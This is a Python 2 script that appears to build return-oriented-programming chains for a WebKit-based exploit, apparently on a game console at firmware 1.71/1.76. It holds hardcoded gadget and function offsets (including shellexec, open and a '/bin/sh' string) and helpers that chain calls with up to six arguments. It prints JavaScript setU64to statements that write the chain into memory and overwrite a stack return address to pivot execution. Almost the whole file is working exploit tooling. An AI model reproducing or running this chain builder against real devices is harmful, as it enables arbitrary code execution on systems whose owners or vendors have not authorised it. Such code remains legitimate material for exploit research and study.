import os

# definition of gadgets
#1.71
#gadget_arg = [ 0x00137cbd, 0x003914ca, 0x00101a72, 0x0025d803, 0x000b854d, 0x003bce7a ] #1.71
#gadget_sp = [ 0x0005fbb5 ]
#1.76
gadget_arg = [ 0x00137cbd, 0x003914ca, 0x00250df2, 0x002bec0d, 0x000b854d, 0x002bfe89]
gadget_sp = [ 0x0005fbb5 ]
gadget_rax = [ 0x0002b542 ]
gadget_store_rax = [ 0x0000db8b ]

# known functions
#1.71
function_loop = 0xB39D7 # + wk_base
function_machdep = 0x10330 # + libkernel_base
function_fopen_s = 0xF00 # + libc_int_base
#1.76
function_shellexec = 0x110F0 # + libkernel_base
function_open = 0xBA30 # + libkernel_base

# strings
#1.71
string_machdep_idps = "libkernel_base + " + str(0x22B47)
string_w = 0x77
#1.76
string_binsh = "libkernel_base + " + str(0x239A4)



# this array will store our "dynamic" rop chain
rop_chain = []

# data array
rop_data = []

def func_0(base, addr):
    rop_chain.append("" + base + " + " + str(addr))

def func_1(base, addr, arg1):
    rop_chain.append("wk_base + " + str(gadget_arg[0]))
    rop_chain.append(str(arg1))
    rop_chain.append("" + base + " + " + str(addr))    

def func_2(base, addr, arg1, arg2):
    rop_chain.append("wk_base + " + str(gadget_arg[1]))
    rop_chain.append(str(arg2))
    rop_chain.append("wk_base + " + str(gadget_arg[0]))
    rop_chain.append(str(arg1))
    rop_chain.append("" + base + " + " + str(addr))

def func_3(base, addr, arg1, arg2, arg3):
    rop_chain.append("wk_base + " + str(gadget_arg[2]))
    rop_chain.append(str(arg3))
    rop_chain.append("wk_base + " + str(gadget_arg[1]))
    rop_chain.append(str(arg2))
    rop_chain.append("wk_base + " + str(gadget_arg[0]))
    rop_chain.append(str(arg1))
    rop_chain.append("" + base + " + " + str(addr))

def func_4(base, addr, arg1, arg2, arg3, arg4):
    rop_chain.append("wk_base + " + str(gadget_arg[3]))
    rop_chain.append(str(arg4))
    rop_chain.append("wk_base + " + str(gadget_arg[2]))
    rop_chain.append(str(arg3))
    rop_chain.append("wk_base + " + str(gadget_arg[1]))
    rop_chain.append(str(arg2))
    rop_chain.append("wk_base + " + str(gadget_arg[0]))
    rop_chain.append(str(arg1))
    rop_chain.append("" + base + " + " + str(addr))

def func_5(base, addr, arg1, arg2, arg3, arg4, arg5):
    rop_chain.append("wk_base + " + str(gadget_arg[4]))
    rop_chain.append(str(arg5))
    rop_chain.append("wk_base + " + str(gadget_arg[3]))
    rop_chain.append(str(arg4))
    rop_chain.append("wk_base + " + str(gadget_arg[2]))
    rop_chain.append(str(arg3))
    rop_chain.append("wk_base + " + str(gadget_arg[1]))
    rop_chain.append(str(arg2))
    rop_chain.append("wk_base + " + str(gadget_arg[0]))
    rop_chain.append(str(arg1))
    rop_chain.append("" + base + " + " + str(addr))

def func_6(base, addr, arg1, arg2, arg3, arg4, arg5, arg6):
    rop_chain.append("wk_base + " + str(gadget_arg[5]))
    rop_chain.append(str(arg6))
    rop_chain.append("wk_base + " + str(gadget_arg[4]))
    rop_chain.append(str(arg5))
    rop_chain.append("wk_base + " + str(gadget_arg[3]))
    rop_chain.append(str(arg4))
    rop_chain.append("wk_base + " + str(gadget_arg[2]))
    rop_chain.append(str(arg3))
    rop_chain.append("wk_base + " + str(gadget_arg[1]))
    rop_chain.append(str(arg2))
    rop_chain.append("wk_base + " + str(gadget_arg[0]))
    rop_chain.append(str(arg1))
    rop_chain.append("" + base + " + " + str(addr))

def store_result(offset):
    rop_chain.append("wk_base + " + str(gadget_arg[0]))
    rop_chain.append(chain_data(offset-8))
    rop_chain.append("wk_base + " + str(gadget_store_rax[0]))

def setU64var(offset, var):
    rop_chain.append("wk_base + " + str(gadget_rax[0]))
    rop_chain.append(var)
    rop_chain.append("wk_base + " + str(gadget_arg[0]))
    rop_chain.append(offset + " - 8")
    rop_chain.append("wk_base + " + str(gadget_store_rax[0]))   

def chain_data(offset):
    return "chain_data + " + str(offset)

def store_data(offset, data):
    rop_data.append(str(chain_data(offset)) + ", " + str(data))

def sp_takeover():
    print "// point a return address of the stack to our chain"
    print "setU64to(stack_base + return_va + 8, chain_addr);"
    print "setU64to(stack_base + return_va, wk_base + " + str(gadget_sp[0]) + ");"

def sp_restore():
    setU64var("return_va", "old_va")
    setU64var("return_va + 8", "old_va8")
    rop_chain.append("wk_base + " + str(gadget_sp[0]))
    rop_chain.append("return_va")

def print_rop():
    i = 0
    print "// store ROP chain"
    for item in rop_chain:
        print "setU64to(chain_addr + " + str(i) + ", " + item + ");"
        i = i + 8

def print_data():
    i = 0
    print "// store data"
    for item in rop_data:
        print "setU64to(" + str(item) + ");"
        i = i + 8

# build our rop chain
# put your calls here :)


func_0("wk_base", function_loop) # hang

# output the chain
print_data()
print_rop()
sp_takeover()
